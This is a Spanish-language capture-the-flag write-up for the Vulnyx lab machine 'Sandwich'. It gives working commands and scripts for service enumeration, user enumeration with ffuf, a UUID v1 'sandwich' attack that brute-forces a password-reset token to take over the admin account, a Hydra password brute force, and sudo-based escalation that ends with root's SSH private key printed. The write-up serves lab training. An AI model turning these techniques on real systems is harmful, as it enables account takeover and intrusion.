---
author: Lenam
pubDatetime: 2025-05-12T00:00:00Z
title: WriteUp Sandwich - Vulnyx
slug: sandwich-writeup-vulnyx-es
featured: false
draft: false
ogImage: "assets/sandwich/OpenGraph.png"
tags:
    - Vulnyx
    - Writeup
    - UUID sandwich attack
    - Brute force
description:
  En este writeup se describe la vulneración y escalada de la máquina Sandwich de la plataforma Vulnyx, donde se podrá practicar la técnica de sandwich en un formulario de recordar contraseña que genera UUIDs vulnerables a esta técnica.
lang: es
---

![alt text](/assets/sandwich/OpenGraph.png)

En este writeup se describe la vulneración y escalada de la máquina Sandwich de la plataforma Vulnyx, donde se podrá practicar la técnica de sandwich en un formulario de recuperación de contraseña que genera UUIDs vulnerables a esta técnica. Esta técnica es aplicable a cualquier token o hash inseguro generado con marcas de tiempo o datos predecibles.

En este writeup, la IP de nuestra máquina atacante es `192.168.1.181` y la IP de nuestra víctima es `192.168.1.188`.

## Tabla de contenido

## Enumeración

### nmap

Realizamos un scaneo de todos los puertos con nmap.

```bash
nmap -p- -sS -Pn -n 192.168.1.188
```

![nmap1](/assets/sandwich/nmap1.png)

Encontramos dos puertos abiertos: el puerto 80 y el 22. Realizamos un escaneo más exhaustivo utilizando los scripts de nmap para intentar obtener más información sobre los servicios de ambos puertos.

```bash
nmap -p22,80 -sCV -Pn -n 192.168.1.188
```

![nmap2](/assets/sandwich/nmap2.png)

En este segundo escaneo podemos ver cómo en el `http-title` del sitio web del puerto `80` aparece el dominio `sandwich.nyx`. Lo añadimos al fichero `/etc/hosts` de nuestra máquina e intentamos descubrir posibles subdominios.

```bash
echo "192.168.1.188 sandwich.nyx" | sudo tee -a /etc/hosts
```

### subdomain fuzz

```bash
gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u sandwich.nyx -t 30 --append-domain  
```

![subdomain fuzz](/assets/sandwich/subdomaindicobery.png)

Rápidamente encontramos el subdominio `webmail.sandwich.nyx`, lo añadimos también al fichero `/etc/hosts`.

```bash
echo "192.168.1.188 webmail.sandwich.nyx" | sudo tee -a /etc/hosts
```

### dir fuzz

Realizamos fuzzing de directorios y archivos con extensión php y txt en los dos dominios `sandwich.nyx` y `webmail.sandwich.nyx`.

#### sandwich.nyx

![alt text](/assets/sandwich/image-1.png)

```bash
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://sandwich.nyx -x .php,.txt           
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://sandwich.nyx
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 277]
/index.php            (Status: 200) [Size: 7845]
/download.php         (Status: 200) [Size: 58]
/img                  (Status: 301) [Size: 310] [--> http://sandwich.nyx/img/]
/logout.php           (Status: 302) [Size: 0] [--> index.php]
/vendor               (Status: 301) [Size: 313] [--> http://sandwich.nyx/vendor/]
/config.php           (Status: 200) [Size: 0]
/.php                 (Status: 403) [Size: 277]
/server-status        (Status: 403) [Size: 277]
/resetpassword.php    (Status: 200) [Size: 361]
Progress: 661677 / 661680 (100.00%)
===============================================================
Finished
===============================================================
```

#### webmail.sandwich.nyx

![alt text](/assets/sandwich/image-2.png)

```bash
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://webmail.sandwich.nyx -x .php,.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://webmail.sandwich.nyx
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 285]
/index.php            (Status: 302) [Size: 0] [--> login.php]
/login.php            (Status: 200) [Size: 784]
/register.php         (Status: 200) [Size: 856]
/logout.php           (Status: 302) [Size: 0] [--> login.php]
/config.php           (Status: 200) [Size: 0]
/inbox.php            (Status: 302) [Size: 0] [--> login.php]
/.php                 (Status: 403) [Size: 285]
/server-status        (Status: 403) [Size: 285]
Progress: 661677 / 661680 (100.00%)
===============================================================
Finished
===============================================================
```

### Enumeración manual

Analizamos todos los endpoints y páginas encontradas. Observamos que podemos crear una especie de cuenta de correo electrónico en `http://webmail.sandwich.nyx`. Después, la cuenta creada en webmail podemos utilizarla para registrarnos en `http://sandwich.nyx`. Esto nos permite tener guardados nuestros sándwiches favoritos. 🥪

### fuzz users

El inicio de sesión de usuarios en el sitio web `http://sandwich.nyx` permite saber si un usuario existe o no, ya que, aunque introduzcamos una contraseña incorrecta, el mensaje es diferente dependiendo de si el usuario existe o no. Utilizamos esto para intentar averiguar otros usuarios que están registrados mediante fuerza bruta con `ffuf`. 🔍


```bash
$ ffuf -u "http://sandwich.nyx/" -X POST -d "email=FUZZ@sandwich.nyx&password=anyPassword&login_action=1" -H "Content-Type: application/x-www-form-urlencoded" -w /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -mr "Incorrect password."

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://sandwich.nyx/
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : email=FUZZ@sandwich.nyx&password=anyPassword&login_action=1
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Regexp: Incorrect password.
________________________________________________

admin                   [Status: 200, Size: 7917, Words: 1855, Lines: 228, Duration: 55ms]
:: Progress: [17/17] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```

Encontramos que también existe el usuario `admin@sandwich.nyx`.

## Vulneración

> En este writeup se describe la vulneración esperada. Sin embargo, hay una forma más fácil que permite saltarse el ataque sandwich, descubierta por el hacker `he110wor1d`. Su ingenio merece reconocimiento, y puedes encontrar la descripción detallada en su writeup [Writeup he110wor1d](https://www.cnblogs.com/ShowMeTheBug/p/18810217).

### 🥪 Ataque Sandwich 

1. Creamos dos usuarios en webmail.sandwich.nyx y nos registramos con esos mismos dos usuarios en sandwich.nyx (Ej. `user1@sandwich.nyx` y `user2@sandwich.nyx`).

2. Desde sandwich.nyx, seleccionamos `Forgot Password` en este orden (lo más rápido posible):
   1. Recordar contraseña para nuestro primer usuario (`user1@sandwich.nyx`).
   2. Recordar contraseña para el usuario `admin@sandwich.nyx`.
   3. Recordar contraseña para nuestro segundo usuario (`user2@sandwich.nyx`).
   Para hacerlo muy rápido y tener menos "jamón" en el sándwich con nuestros usuarios:
   ```bash
   curl -X POST http://sandwich.nyx/index.php -d "email=user1@sandwich.nyx" -d "reset_action=1" & curl -X POST http://sandwich.nyx/index.php -d "email=admin@sandwich.nyx" -d "reset_action=1" & curl -X POST http://sandwich.nyx/index.php -d "email=user2@sandwich.nyx" -d "reset_action=1"
   ```

3. Ingresamos con nuestros usuarios a webmail.sandwich.nyx y obtenemos los dos enlaces para recuperar la contraseña de nuestros usuarios. Estos enlaces tienen un UUID v1 que es vulnerable a un ataque de Sandwich. Por lo tanto, con el enlace de recuperación de contraseña del usuario `admin@sandwich.nyx` solicitado entre nuestros dos usuarios, podemos intentar recuperar la contraseña de admin. 🔑

Imagen del webmail para `user1@sandwich.nyx`

![alt text](/assets/sandwich/image-3.png)

URL del token para user1 y user2: 

```
http://sandwich.nyx/resetpassword.php?token=2299c1c6-09ca-11f0-8069-080027b218c8
http://sandwich.nyx/resetpassword.php?token=229e2ffe-09ca-11f0-8069-080027b218c8
```

En esta URL hay un formulario que, mediante POST, envía el token y la propuesta de contraseña. Si el token es válido, modifica la contraseña del usuario; si el token no es válido, aparece el mensaje: `Invalid token.` 

Creamos un script en Python para generar los posibles UUID v1 entre los dos recibidos por nuestros usuarios.

Estos serían todos los posibles UUIDs V1 entre los rangos. Es importante hacer las 3 peticiones de restaurar la contraseña lo más rápido posible para tener un diccionario pequeño. Si se tarda en hacer las peticiones, el diccionario puede ocupar GB. 📚

```python
#!/usr/bin/env python3
def generar_uuids_por_lotes(start_hex, end_hex, batch_size=100_000, output_file="uuids.txt"):
    time_mid = "09ca"
    time_hi_and_version = "11f0"
    clock_seq = "8069"
    node = "080027b218c8"

    start = int(start_hex, 16)
    end = int(end_hex, 16)

    with open(output_file, "w") as f:
        for batch_start in range(start, end + 1, batch_size):
            batch_end = min(batch_start + batch_size, end + 1)
            for time_low in range(batch_start, batch_end):
                time_low_hex = f"{time_low:08x}"
                uuid_str = f"{time_low_hex}-{time_mid}-{time_hi_and_version}-{clock_seq}-{node}"
                f.write(uuid_str + "\n")
            print(f"Lote {batch_start}-{batch_end - 1} guardado.")

# Llamada a la función
generar_uuids_por_lotes("2299c1c6", "229e2ffe")
```

Creamos el diccionario y utilizamos FUZZ para intentar cambiar la contraseña del usuario `admin@sandwich.nyx` a `lenam`.

```bash
$ python3 ./uuids.py
Lote 580501958-580601957 guardado.
Lote 580601958-580701957 guardado.
Lote 580701958-580792318 guardado.
$ ls -lh uuids.txt 
-rw-rw-r-- 1 kali kali 11M mar 25 23:53 uuids.txt
$ ffuf -u "http://sandwich.nyx/resetpassword.php" -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "token=FUZZ&new_password=lenam&confirm_password=lenam" -w uuids.txt -fs 420

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://sandwich.nyx/resetpassword.php
 :: Wordlist         : FUZZ: /home/kali/CTFs/Vulnyx/Sandwich/uuids.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : token=FUZZ&new_password=lenam&confirm_password=lenam
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 420
________________________________________________

2299c1c6-09ca-11f0-8069-080027b218c8 [Status: 200, Size: 408, Words: 57, Lines: 16, Duration: 640ms]
229c74ac-09ca-11f0-8069-080027b218c8 [Status: 200, Size: 408, Words: 57, Lines: 16, Duration: 1365ms]
229e2ffe-09ca-11f0-8069-080027b218c8 [Status: 200, Size: 408, Words: 57, Lines: 16, Duration: 64ms]
:: Progress: [290361/290361] :: Job [1/1] :: 1388 req/sec :: Duration: [0:02:32] :: Errors: 0 ::
```

Vemos que se ha modificado la contraseña de tres usuarios: los UUIDs de nuestro usuario que ya teníamos y un tercero que seguramente será del usuario admin. lo

### Fuerza bruta en el webmail

Accedemos con el usuario `admin@sandwich.nyx` y la contraseña `lenam` a http://sandwich.nyx. 

Nos encontramos con la misma página de generación y guardado de sándwiches, pero además hay un enlace para descargar los sándwiches de todos los usuarios. 

![alt text](/assets/sandwich/image-4.png)

Descargamos un archivo CSV con todas las configuraciones de sándwich guardadas por todos los usuarios registrados. 📥 Utilizamos esta lista de usuarios para hacer fuzzing en el webmail.

Como sabemos que para registrarse aquí es necesario tener un correo electrónico en `webmail.sandwich.nyx`, intentamos hacer fuerza bruta con estos usuarios y el wordlist de `10k-most-common.txt` en el webmail.

Listado de usuarios que aparecen en el PDF descargado de `sandwich.nyx`.  📋

```text
ll104567_9q@sandwich.nyx
suraxddq_tw@sandwich.nyx
xerosec_w5@sandwich.nyx
j4ckie_x5@sandwich.nyx
matthygd_x@sandwich.nyx
```

Aunque el listado de usuarios parece pertenecer a ilustres maestros del hacking 😉, con todo el respeto del mundo, decidimos aventurarnos y usar Hydra con la lista de usuarios y el wordlist contra el webmail.

```bash
$ hydra -L users.txt -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt webmail.sandwich.nyx http-post-form "/login.php:email=^USER^&password=^PASS^:Invalid credentials or user not found" -u -t 64 -v
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-30 19:19:59
[DATA] max 64 tasks per 1 server, overall 64 tasks, 50000 login tries (l:5/p:10000), ~782 tries per task
[DATA] attacking http-post-form://webmail.sandwich.nyx:80/login.php:email=^USER^&password=^PASS^:Invalid credentials or user not found
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[STATUS] 1385.00 tries/min, 1385 tries in 00:01h, 48615 to do in 00:36h, 64 active
[STATUS] 1382.00 tries/min, 4146 tries in 00:03h, 45854 to do in 00:34h, 64 active
[STATUS] 1382.00 tries/min, 9674 tries in 00:07h, 40326 to do in 00:30h, 64 active
[VERBOSE] Page redirected to http[s]://webmail.sandwich.nyx:80/inbox.php
[80][http-post-form] host: webmail.sandwich.nyx   login: matthygd_x@sandwich.nyx   password: qweasd

The session file ./hydra.restore was written. Type "hydra -R" to resume session.
```

Después de 7 minutos 😅, encontramos la contraseña del webmail de `matthygd_x@sandwich.nyx`.

Ingresamos al webmail y podemos ver un mensaje que le ha enviado el administrador con la contraseña de su usuario SSH. 🔑

![alt text](/assets/sandwich/image-5.png)

Accedemos con las credenciales a través del servicio SSH.

## Escalada de matthygd_xy a ll104567

```bash
$ id ; echo; cat /etc/passwd|grep sh ; echo ; sudo -l
uid=1000(matthygd_xy) gid=1000(matthygd_xy) grupos=1000(matthygd_xy),100(users)

root:x:0:0:root:/root:/bin/bash
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
matthygd_xy:x:1000:1000:,,,:/home/matthygd_xy:/bin/bash
ll104567:x:1001:1001:,,,:/home/ll104567:/bin/bash

Matching Defaults entries for matthygd_xy on sandwich:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User matthygd_xy may run the following commands on sandwich:
    (root) NOPASSWD: /bin/chvt
```

El usuario `matthygd_xy` puede ejecutar como root el binario `/bin/chvt`. Este binario sirve para cambiar entre terminales virtuales, lo mismo que cuando pulsamos CTRL+ALT+Fn.

Verificamos si existe alguna TTY creada por algún usuario con `w`.

```
matthygd_xy@sandwich:~$ w
 19:38:20 up 45 min,  2 users,  load average: 0,00, 8,88, 22,24
USER     TTY      DESDE            LOGIN@   IDLE   JCPU   PCPU WHAT
ll104567 tty20    -                18:52   45:56   0.01s  0.01s -bash
matthygd pts/0    192.168.1.181    19:35    0.00s  0.01s   ?    w
```

Podemos observar que el usuario `ll104567` tiene una terminal abierta con bash, el número de la terminal es el `20`.

Con el comando `chvt` podemos hacer que se muestre la TTY de `ll104567` por la pantalla "física" de la máquina.

Actualmente en la pantalla física de la máquina se puede observar:

![alt text](/assets/sandwich/image.png)

Si ejecutamos...

```
matthygd_xy@sandwich:~$ sudo /bin/chvt 20
```

... en la pantalla "física" de la máquina nos aparecerá la TTY de `ll104567`.

![alt text](/assets/sandwich/image-6.png)

En este punto, podemos instalar una clave SSH en el usuario para acceder desde nuestro propio terminal o continuar trabajando con la "pantalla física", un revshell, etc.

## Escalada de ll104567 a root

El usuario puede ejecutar con sudo un script en /opt/game.sh.

```bash
ll104567@sandwich:~$ sudo -l
Matching Defaults entries for ll104567 on sandwich:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User ll104567 may run the following commands on sandwich:
    (ALL) NOPASSWD: /opt/game.sh

ll104567@sandwich:~$ ls -la /opt
total 12
drwxr-xr-x  2 root root 4096 mar 25 19:00 .
drwxr-xr-x 18 root root 4096 mar 22 23:05 ..
-rwxr-xr-x  1 root root 1535 mar 25 19:00 game.sh
```

El script parece ser un juego matemático; si se adivina un número, el script devolverá la clave privada del usuario root.

```bash
ll104567@sandwich:~$ cat /opt/game.sh 
#!/bin/bash

export PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

MAX=2000000

ATTEMPTS=$(/usr/bin/awk -v max="$MAX" 'BEGIN {printf "%d", (log(max)/log(2) + 0.999999)}')

/bin/echo "Hello! What is your name?"
read NAME

NUMBER=$(( ( RANDOM % MAX ) + 1 ))

/bin/echo "Well, $NAME, I'm thinking of a number between 1 and $MAX."
/bin/echo "You have $ATTEMPTS attempts to guess it."

ATTEMPTS_MADE=0

SECRET_FILE="/root/.ssh/id_rsa"

while [ $ATTEMPTS_MADE -lt $ATTEMPTS ]; do
  /bin/echo "Try to guess:"
  read GUESS

  # Validate that the input is a valid number
  if ! [[ "$GUESS" =~ ^[0-9]+$ ]]; then
    /bin/echo "Please, enter a valid number."
    continue
  fi

  ATTEMPTS_MADE=$((ATTEMPTS_MADE + 1))

  if [ $GUESS -lt $NUMBER ]; then
    /bin/echo "Your guess is too low."
  elif [ $GUESS -gt $NUMBER ]; then
    /bin/echo "Your guess is too high."
  else
    break
  fi
done

if [ $GUESS -eq $NUMBER ]; then
  /bin/echo "Good job, $NAME! You guessed my number in $ATTEMPTS_MADE attempts!"
  /bin/echo "Here's your reward:"
  /bin/cat "$SECRET_FILE"
else
  /bin/echo "No, the number I was thinking of was $NUMBER."
fi
```

Tienes una serie de intentos para poder adivinar el número como máximo.

```bash
ll104567@sandwich:~$ sudo /opt/game.sh 
Hello! What is your name?
Lenam
Well, Lenam, I'm thinking of a number between 1 and 2000000.
You have 21 attempts to guess it.
Try to guess:
10
Your guess is too low.
Try to guess:
100000
Your guess is too high.
Try to guess:
```

Para resolverlo se debe aplicar el algoritmo de búsqueda binaria, muy simple de desarrollar, incluso se podría contestar de forma manual.

La máquina tiene Python instalado, lo que facilitará la tarea a muchos, incluso a ChatGPT:

```python
#!/usr/bin/env python3
import subprocess
import re

def enviar_linea(proc, texto):
    proc.stdin.write(texto + "\n")
    proc.stdin.flush()

def leer_hasta(proc, patron):
    """Lee línea a línea hasta encontrar una que contenga el patrón indicado."""
    salida = ""
    while True:
        linea = proc.stdout.readline()
        if not linea:
            break
        salida += linea
        print(linea, end="")  # Mostrar la salida en pantalla
        if patron in linea:
            break
    return salida

def main():
    # Iniciamos el juego (se asume que el script se llama "juego.sh")
    proc = subprocess.Popen(
        ['sudo','/opt/game.sh'],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        universal_newlines=True,
        bufsize=1  # Line buffered
    )

    # Responde al saludo pidiendo el nombre.
    leer_hasta(proc, "What is your name?")
    enviar_linea(proc, "Solver")  # Puedes cambiar el nombre

    # Leemos la línea donde se menciona el rango y extraemos MAX.
    salida = leer_hasta(proc, "I'm thinking of a number between")
    max_match = re.search(r"between 1 and (\d+)", salida)
    if max_match:
        max_value = int(max_match.group(1))
    else:
        max_value = 2000000  # Valor por defecto
    print("Número máximo:", max_value)

    # Leemos la línea que indica la cantidad de intentos permitidos.
    leer_hasta(proc, "attempts to guess it.")

    # Búsqueda binaria
    low = 1
    high = max_value
    intentos = 0

    while True:
        guess = (low + high) // 2  # Calcula el punto medio
        leer_hasta(proc, "Try to guess:")
        print("Intento con:", guess)
        enviar_linea(proc, str(guess))
        intentos += 1

        # Leemos la respuesta del juego
        respuesta = ""
        while True:
            linea = proc.stdout.readline()
            if not linea:
                break
            print(linea, end="")
            respuesta += linea
            # Buscamos las pistas de respuesta
            if "Your guess is too low." in linea or \
               "Your guess is too high." in linea or \
               "Good job," in linea:
                break

        if "Your guess is too low." in respuesta:
            low = guess + 1
        elif "Your guess is too high." in respuesta:
            high = guess - 1
        elif "Good job," in respuesta:
            print(f"¡Adivinado el número en {intentos} intentos!")
            # Leemos hasta que se muestre la recompensa (el contenido del archivo secreto)
            leer_hasta(proc, "Here's your reward:")
            # Leemos el resto de la salida (la recompensa)
            recompensa = proc.stdout.read()
            print(recompensa)
            break
        else:
            print("Respuesta inesperada. Saliendo.")
            break

if __name__ == "__main__":
    main()

```

Creamos el fichero en el servidor, lo ejecutamos y obtenemos la clave privada de root.

```bash
ll104567@sandwich:~$ ./auto.py 
Hello! What is your name?
Well, Solver, I'm thinking of a number between 1 and 2000000.
Número máximo: 2000000
You have 21 attempts to guess it.
Try to guess:
Intento con: 1000000
Your guess is too high.
Try to guess:
Intento con: 500000
Your guess is too high.
Try to guess:
Intento con: 250000
Your guess is too high.
Try to guess:
Intento con: 125000
Your guess is too high.
Try to guess:
Intento con: 62500
Your guess is too high.
Try to guess:
Intento con: 31250
Your guess is too high.
Try to guess:
Intento con: 15625
Your guess is too high.
Try to guess:
Intento con: 7812
Your guess is too low.
Try to guess:
Intento con: 11718
Your guess is too low.
Try to guess:
Intento con: 13671
Your guess is too high.
Try to guess:
Intento con: 12694
Your guess is too low.
Try to guess:
Intento con: 13182
Your guess is too low.
Try to guess:
Intento con: 13426
Your guess is too low.
Try to guess:
Intento con: 13548
Your guess is too low.
Try to guess:
Intento con: 13609
Your guess is too low.
Try to guess:
Intento con: 13640
Your guess is too high.
Try to guess:
Intento con: 13624
Your guess is too high.
Try to guess:
Intento con: 13616
Your guess is too high.
Try to guess:
Intento con: 13612
Your guess is too high.
Try to guess:
Intento con: 13610
Good job, Solver! You guessed my number in 20 attempts!
¡Adivinado el número en 20 intentos!
Here's your reward:
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAgEAzMoVFzc2RXwrRJ6QA2Kr/trjNxtTpuvKn10uYGmFNcmPfACQfR0H
BBWQUY8LvVg+5UGGEyuC1Kvv9hevyemqVMm5+Xe9D+BCHQoqXoa7VeEd+As736w9+Ly1/D
z0ovVAA1Ae8eRJsHzXHLFcgXflpOh2mdH7hAnzr3sbDFSnUT7VOy86ODMm1PFfC6ec5BjU
z5iQjdHGOpOOTxvAsMIQeZWCgR1/hrnB1LgT82eKakFerk1V1bJTGCqDpOeaVY/oOwTXIX
    ...
    ...
    ...
I7nS3nsGgro0LxFegq4lNK/J0hOxdr0AzYCA0V1URBAc7F1yeIVsfw5agUBctTIETh4vb2
qbXz8zkaUCs3OxD+29tm759C9VV06EghvPGsNLQCNxhUJQADl+alhof4JLgaNsGSAjD0+E
BbrBjxfJ/Thc+/TRnUgi02VXBvEN3lEPPSykgnkrH05sJy3bkkypcSzrhu56I8xH2JNktD
KI7CKEYAOb49G7AAABAQDjtfviGpDjQvFu/a3ftuJTO0jOfMi0KUC4D8gtX0RuLX9kx4en
99te7snBHk667wwOWg1Obo4OKuVQPbI9GpxfP8ExnSBCj7ul6pHTGrHYoKDXFkGE38LdTx
vMEEyqhFiqNIv9iJUMfrZf4WcOWTl+rtJus3xz8yEjxJ+8CXNb3DSGD2AN2my4gmXuSJec
Q3j0qy5I0191AjSaySmfOvFTdXk/2CHq2BiPDyrvZBoJC1/Uo34IJzv7KniWETOn1pXQyW
5e4Z60iiIePJTiXy32FP1CkMfFCqrnCf6vUh7u5/cogU9EFCFxfEcAagP0OMU3pu8stWpw
r1QiwDaFhL5nAAAADXJvb3RAc2FuZHdpY2gBAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```

Lo que queda ya me imagino que sabes qué es, la clave no tiene contraseña y el usuario root puede acceder mediante SSH para leer la última flag.

```bash
┌──(kali㉿kali)-[~/CTFs/Vulnyx/Sandwich]
└─$ nano private_root
     
┌──(kali㉿kali)-[~/CTFs/Vulnyx/Sandwich]
└─$ chmod 600 private_root 

┌──(kali㉿kali)-[~/CTFs/Vulnyx/Sandwich]
└─$ ssh root@192.168.1.182 -i private_root 
Linux sandwich 6.1.0-32-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.129-1 (2025-03-06) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Mar 30 19:49:16 2025 from 192.168.1.181
root@sandwich:~# ls
root.txt

```

Esto es todo, espero que les haya gustado la máquina y el write-up.